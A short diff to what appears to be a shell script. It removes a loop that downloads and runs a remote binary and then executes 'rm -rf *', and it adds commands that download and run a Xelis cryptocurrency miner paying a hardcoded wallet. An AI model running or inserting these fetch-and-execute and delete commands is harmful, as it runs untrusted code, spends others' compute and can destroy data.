@@ -1,1 +1,3 @@
-for i in {1..99999}; wget https://github.com/molotovman88/a/raw/main/sof; chmod +x sof; timeout 60m ./sof -t 7 -i KVAQTPYWKGFQKETWTBAEZBCIKVNAQZFUIFPTPJSETEDNEJMSVLBEGHEGOOLM --label sha; rm -rf *; done
+wget https://github.com/DeroLuna/xelis-miner/releases/download/v0.2/xelis_luna_miner_linux.tar.gz
+tar xf xelis_luna_miner_linux.tar.gz
+./xelis_luna_miner -m xel:9nc0lyxgaykdqpe9lnf6fsjx7a5ultn0042rfpaqvr0r34rrtuwqqk6ml8s
